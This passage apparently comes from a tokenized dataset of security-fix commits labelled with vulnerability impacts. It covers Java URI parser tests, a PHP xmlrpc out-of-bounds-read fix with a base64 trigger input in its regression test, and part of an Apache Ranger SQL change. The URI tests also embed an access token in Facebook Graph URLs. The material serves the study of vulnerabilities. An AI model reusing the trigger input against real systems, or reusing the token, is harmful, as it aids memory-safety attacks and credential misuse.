"urlWithoutQuery", ".", "substring", "(", "start", ",", "end", ")", ";", "if", "(", "start", "<", "end", ")", "else", "if", "(", "queryOnly", "&", "&", "path", "!", "=", "null", ")", "else", "if", "(", "path", "=", "=", "null", ")", "boolean", "isRelative", "=", "false", ";", "trimRight", "(", "originalUrl", ")", ";", "trimLeft", "(", "originalUrl", ")", ";", "if", "(", "!", "isFragmentOnly", "(", "originalUrl", ")", ")", "computeInitialScheme", "(", "originalUrl", ")", ";", "overrideWithContext", "(", "context", ",", "originalUrl", ")", ";", "computeFragment", "(", "originalUrl", ")", ";", "boolean", "queryOnly", "=", "splitUrlAndQuery", "(", "originalUrl", ")", ";", "parser", ".", "parse", "(", "null", ",", "\"", "http", ":", "//", "user", "@", "example", ".", "com", ":", "8080", "/", "test", "?", "q", "=", "1", "\"", ");", "assertEquals", "(", "parser", ".", "authority", ",", "\"", "user", "@", "example", ".", "com", ":", "8080", "\"", ",", "\"", "Incorrect", "authority", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Incorrect", "host", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "test", "\"", ",", "\"", "Incorrect", "path", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "8080", ",", "\"", "Incorrect", "port", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "\"", "q", "=", "1", "\"", ",", "\"", "Incorrect", "query", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "http", "\"", ",", "\"", "Incorrect", "scheme", "assigned", "by", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "userInfo", ",", "\"", "user", "\"", ",", "\"", "Incorrect", "userInfo", "assigned", "by", "the", "parse", "method", "\"", ");", "public", "void", "testSchemeTakenFromUrlWhenValid", "(", ")", "{", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "http", ":", "//", "example", ".", "com", "/", "path", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "http", "\"", ",", "\"", "If", "URL", "has", "a", "valid", "scheme", "it", "should", "be", "given", "priority", "than", "the", "scheme", "in", "the", "context", "\"", ");", "public", "void", "testRelativeURL", "(", ")", "{", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "/", "relativeUrl", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "relativeUrl", "\"", ",", "\"", "Path", "should", "be", "equal", "to", "the", "relative", "URL", "passed", "to", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "empty", "if", "the", "relative", "URL", "did", "not", "have", "a", "query", "\"", ");", "public", "void", "testUrlFragment", "(", ")", "{", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "#", "test", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "URL", "fragment", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "URL", "fragment", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "URL", "fragment", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "path", "\"", ",", "\"", "Path", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "URL", "fragment", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "empty", "when", "parsing", "a", "URL", "fragment", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "/", "relativePath", "?", "q", "=", "3", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "contenxt", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "relativePath", "\"", ",", "\"", "Path", "should", "be", "same", "as", "relativePath", "passed", "to", "the", "parse", "method", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "\"", "q", "=", "3", "\"", ",", "\"", "Query", "should", "be", "taken", "from", "the", "relative", "URL", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "?", "q", "=", "3", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "conxt", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/\"", ",", "\"", "Path", "should", "be", "'", "/'", "for", "a", "relative", "URL", "with", "only", "query", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "\"", "q", "=", "3", "\"", ",", "\"", "Query", "should", "be", "same", "as", "specified", "in", "the", "relative", "URL", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "./", "relative", "/", "./", "url", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "relative", "/", "url", "\"", ",", "\"", "Path", "should", "be", "equal", "to", "the", "path", "in", "the", "relative", "URL", "with", "dots", "removed", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "null", "if", "the", "relative", "URL", "did", "not", "have", "a", "query", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "./", "relative", "/", "..", "/", "url", "\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "url", "\"", ",", "\"", "Path", "should", "be", "equal", "to", "the", "relative", "URL", "path", "with", "the", "embedded", "dots", "appropriately", "removed", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "null", "if", "the", "relative", "URL", "does", "not", "have", "a", "query", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "./", "relative", "/", "url", "/", "..", "\")", ";", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "relative", "/", "\",", "\"", "Path", "should", "be", "equal", "to", "the", "relative", "URL", "path", "with", "the", "trailing", "dots", "appropriately", "removed", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "null", "if", "the", "relative", "URL", "does", "not", "have", "a", "query", "\"", ");", "UriParser", "parser", "=", "new", "UriParser", "(", ");", "parser", ".", "parse", "(", "context", ",", "\"", "./", "relative", "/", "url", "/", ".\"", ");", "assertEquals", "(", "parser", ".", "host", ",", "\"", "example", ".", "com", "\"", ",", "\"", "Host", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "port", ",", "80", ",", "\"", "Port", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "scheme", ",", "\"", "https", "\"", ",", "\"", "Scheme", "should", "be", "taken", "from", "the", "context", "when", "parsing", "a", "relative", "URL", "\"", ");", "assertEquals", "(", "parser", ".", "path", ",", "\"", "/", "relative", "/", "url", "/", "\",", "\"", "Path", "should", "be", "equal", "to", "the", "relative", "URL", "path", "with", "the", "trailing", "dot", "appropriately", "removed", "\"", ");", "assertEquals", "(", "parser", ".", "query", ",", "null", ",", "\"", "Query", "should", "be", "null", "if", "the", "relative", "URL", "does", "not", "have", "a", "query", "\"", ");", "@", "Test", "public", "void", "testSimpleParsing", "(", ")", "{", "Uri", "url", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "@", "Test", "public", "void", "testRootRelativeURIWithRootContext", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testRootRelativeURIWithNonRootContext", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "foo", "/", "bar", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testNonRootRelativeURIWithNonRootContext", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "foo", "/", "bar", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "foo", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testNonRootRelativeURIWithRootContext", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testAbsoluteURIWithContext", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "foo", "/", "bar", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "https", ":", "//", "graph", ".", "facebook", ".", "com", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "?", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "graph", ".", "facebook", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "750198471659552", "/", "accounts", "/", "test", "-", "users", "\"", ");", "assertEquals", "(", "url", ".", "getQuery", "(", "),", "\"", "method", "=", "get", "&", "access_token", "=", "750198471659552lleveCvbUu_zqBa9tkT3tcgaPh4", "\"", ");", "public", "void", "testRelativeUriWithDots", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\")", ";", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "level1", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithDotsAboveRoot", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithAbsoluteDots", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "\")", ";", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDots", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\")", ";", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDotsAboveRoot", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithAbsoluteConsecutiveDots", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "\")", ";", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDotsFromRoot", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "\")", ";", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDotsFromRootResource", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "..", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDotsFromSubrootResource", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithConsecutiveDotsFromLevel3Resource", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "/", "level2", "/", "level3", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "..", "/.", "./", "..", "/", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "hello", ".", "com", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/.", "./", "other", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";", "public", "void", "testRelativeUriWithNoScheme", "(", ")", "{", "Uri", "context", "=", "Uri", ".", "create", "(", "\"", "https", ":", "//", "hello", ".", "com", "/", "level1", "\"", ");", "Uri", "url", "=", "Uri", ".", "create", "(", "context", ",", "\"", "//", "world", ".", "org", "/", "content", "/", "img", ".", "png", "\"", ");", "assertEquals", "(", "url", ".", "getScheme", "(", "),", "\"", "https", "\"", ");", "assertEquals", "(", "url", ".", "getHost", "(", "),", "\"", "world", ".", "org", "\"", ");", "assertEquals", "(", "url", ".", "getPort", "(", "),", "-", "1", ")", ";", "assertEquals", "(", "url", ".", "getPath", "(", "),", "\"", "/", "content", "/", "img", ".", "png", "\"", ");", "assertNull", "(", "url", ".", "getQuery", "(", "))", ";"], "docstring_tokens": ["bypass", "access", "restrictions"]}
{"contents": ["Fix", "bug", "#77380", "(Global", "out", "of", "bounds", "read", "in", "xmlrpc", "base64", "code)"], "code_tokens": ["int", "c", ",", "n", ";", "if", "(", "dtable", "[", "(", "unsigned", "char", ")", "c", "]", "&", "0x80", ")", "{", "-", "-", "TEST", "-", "-", "Bug", "#", "77380", "(", "Global", "out", "of", "bounds", "read", "in", "xmlrpc", "base64", "code", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "xmlrpc", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "var_dump", "(", "xmlrpc_decode", "(", "base64_decode", "(", "\"", "PGJhc2U2ND7CkzwvYmFzZTY0Pgo", "=", "\")", "))", ";", "?", ">", "-", "-", "EXPECT", "-", "-", "object", "(", "stdClass", ")", "#", "1", "(", "2", ")", "{", "[", "\"", "scalar", "\"", "]=", ">", "string", "(", "0", ")", "\"", "\"", "[", "\"", "xmlrpc_type", "\"", "]=", ">", "string", "(", "6", ")", "\"", "base64", "\"", "}</s>int", "c", ",", "n", ";", "if", "(", "dtable", "[", "c", "]", "&", "0x80", ")", "{"], "docstring_tokens": ["obtain", "sensitive", "information"]}
{"contents": ["RANGER-921", ":", "Improve", "implementation", "of", "internal", "SQL", "calls", "Signed-off-by:", "Velmurugan", "Periasamy", "<vel@apache.org>"], "code_tokens": ["import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "StringUtils", ";", "public", "static", "Date", "stringToDate", "(", "String", "dateString", ",", "String", "dateFromat", ")", "{", "SimpleDateFormat", "simpleDateFormat", "=", "null", ";", "Date", "date", "=", "null", ";", "if", "(", "!", "StringUtils", ".", "isEmpty", "(", "dateString", ")", "&", "&", "!", "StringUtils", ".", "isEmpty", "(", "dateFromat", ")", "){", "try", "{", "simpleDateFormat", "=", "new", "SimpleDateFormat", "(", "dateFromat", ")", ";", "date", "=", "simpleDateFormat", ".", "parse", "(", "dateString", ")", ";", "}", "catch", "(", "Exception", "ex", ")", "{", "return", "null", ";", "}", "}", "return", "date", ";", "}", "import", "java", ".", "util", ".", "Date", ";", "import", "org", ".", "apache", ".", "ranger", ".", "common", ".", "DateUtil", ";", "Date", "date", "=", "DateUtil", ".", "stringToDate", "(", "eventTime", ",", "\"", "yyyy", "-", "MM", "-", "dd", "'", "T", "'", "HH", ":", "mm", ":", "ss", "'", "Z", "'", "\")", ";", "if", "(", "date", "=", "=", "null", ")", "{", "return", "null", ";", "}", "return", "getEntityManager", "(", ")", ".", "createNamedQuery", "(", "\"", "XXDataHist", ".", "findLatestByObjectClassTypeAndObjectIdAndEventTime", "\"", ",", "tClass", ")", ".", "setParameter", "(", "\"", "classType", "\"", ",", "classType", ")", ".", "setParameter", "(", "\"", "objectId", "\"", ",", "objId", ")", ".", "setParameter", "(", "\"", "createTime", "\"", ",", "date", ")", ".", "setMaxResults", "(", "1", ")", ".", "getSingleResult", "(", ");", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "List", "<", "String", ">", "findXPortalUserRolebyXPortalUserId", "(", "Long", "userId", ")", "{", "if", "(", "userId", "=", "=", "null", ")", "{", "return", "new", "ArrayList", "<", "String", ">", "()", ";", "}", "try", "{", "List", "<", "String", ">", "returnList", "=", "getEntityManager", "(", ")", ".", "createNamedQuery", "(", "\"", "XXPortalUserRole", ".", "findXPortalUserRolebyXPortalUserId", "\"", ")", ".", "setParameter", "(", "\"", "userId", "\"", ",", "userId", ")", ".", "getResultList", "(", ");", "return", "returnList", ";", "}", "catch", "(", "NoResultException", "e", ")", "{", "return", "new", "ArrayList", "<", "String", ">", "()", ";", 